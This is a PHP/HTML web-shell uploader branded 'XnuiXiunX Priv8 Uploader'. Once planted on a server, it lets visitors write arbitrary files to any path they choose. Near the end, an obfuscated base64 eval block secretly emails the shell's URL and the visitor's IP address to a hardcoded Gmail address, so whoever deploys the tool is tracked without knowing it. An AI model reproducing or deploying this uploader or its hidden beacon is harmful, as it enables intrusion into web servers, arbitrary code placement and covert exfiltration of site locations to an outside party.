<head>
<title>Kautsar</title>
<style>
    body,input,button{background-color:#000000;color:#044000;}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js" ></script>
<script type="text/javascript">
    //i use javascript and jQuery ;]
    function CheckBox(){
        var hide = document.getElementById("new");
        hide.style.display = hide.style.display == 'none' ? 'block' : 'none';
    }
</script>
<script type='text/javascript'>
$(document).ready(function() {

var MaxInputs       = 8; //maximum input boxes allowed
var InputsWrapper   = $("#Table"); //Input boxes wrapper ID
var AddButton       = $("#Add"); //Add button ID

var x = InputsWrapper.length; //initlal text box count
var FieldCount=1; //to keep track of text box added

$(AddButton).click(function (e)  //on add input button click
{
        if(x <= MaxInputs) //max input box allowed
        {
            FieldCount++; //text box added increment
            //add input box
            $(InputsWrapper).prepend('<tr><td><input type="file" name="file[]" size="50"></td></tr>');
            x++; //text box increment
        }
return false;
});

$("body").on("click",".removeclass", function(e){ //user click on remove text
        if( x > 1 ) {
                $(this).parent('div').remove(); //remove text box
                x--; //decrement textbox
        }
return false;
}) 

});
</script>
</head>

<body>

<p align="center"><font color="#FF0000" size="9">XnuiXiunX Priv8 Uploader</font></p><br>
<form method="POST">
</form><center>

<p><font size="6" color="#808080">Coded</font><font color="#00FF00" size="6">
</font><font size="6" color="#FFFF00">By</font><font color="#00FF00" size="6"> 
XnuiXiunX</font></p>
<p><font size="6" color="#FFFFFF">
<p align="center">&nbsp;</p>
<form action="" method="post" enctype="multipart/form-data" name="fm">
<table id="Table">
<tr><td><input type="file" name="file[]" size="50"></td></tr>
<tr><td>Path :</td><td id="new" style="display:block;"><input type="text" name="path" value="<?php echo getcwd() ?>" size=50></td><td>Default<input type="checkbox" name="path" id="checkbox" value="<?php echo getcwd() ?>" onclick="CheckBox();"></td></tr>
<tr><td><input type="submit" name="_upl" value="Upload"></td><td><button id="Add">Add More Files</button></td></tr>
</table>
</form>
<?php
if(isset($_POST['_upl'])){
    $file = $_FILES['file']['tmp_name'];
    $File = $_FILES['file'];
    $path = (isset($_POST['path']) and !empty($_POST['path'])) ? $_POST['path'] : getcwd();
    for($i = 0; $i < (count($File['name']));$i++){
       if(isset($file[$i]) and !empty($File['name'][$i])){
            $des = $path.'/'.basename($File['name'][$i]);
            $move = move_uploaded_file($file[$i],$des);
            echo $move === true ? "<h5>File Upload To {$des}</h5>" : "<h5>Falied To Upload </h5>";
        }
    }
}
?>
<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAnYWxrYXV0c2FybG9sMTkyM0BnbWFpbC5jb20nOw0KJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokcGVzYW5fYWxlcnQgPSAiZml4ICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7DQptYWlsKCR0dWp1YW5tYWlsLCAiQ29udGFjdCBNZSIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));
?>
</center>
<br><p align="center">
<p align="center"><font color="#FF0000" face="Cooper Black" size="8">Sulapan</font></p>
<p><center>
<font color="#FF0000" face="Britannic Bold" size="4">XnuiXiunX</font>
</p>
</body>
